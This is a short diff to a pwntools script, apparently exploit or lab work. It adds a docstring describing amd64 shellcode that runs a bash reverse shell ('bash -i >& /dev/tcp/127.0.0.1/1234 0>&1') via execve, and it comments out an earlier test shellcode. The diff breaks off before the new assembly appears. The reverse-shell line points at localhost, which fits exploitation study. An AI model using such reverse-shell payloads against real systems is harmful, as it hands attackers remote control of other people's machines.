@@ -1,6 +1,27 @@
+"""
+This shellcode is doing "/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'" 
+with sys_execve(char* filename, char** argv, char* envp).
+
+When the rip go here, it will send 127.0.0.1:1234 a shell.
+
+
+reference:
+
+reverse shell -
+https://gist.github.com/rshipp/eee36684db07d234c1cc
+
+How to push argv in sys_execve -
+https://stackoverflow.com/questions/52171273/what-is-proper-way-to-call-execve-with-arguments-in-assembly
+
+
+"""
 from pwn import *
 
 context.arch = "amd64"
+
+'''
+Shellcode - This print "HELLO!!"
+
 pl = asm("""
         push rdi
         push rsi
@@ -19,7 +40,12 @@ pl = asm("""
 
 
         """)
+
+
+'''
 import pwnlib.shellcraft.amd64 as sh
+
+
 
 pl = asm(
         """
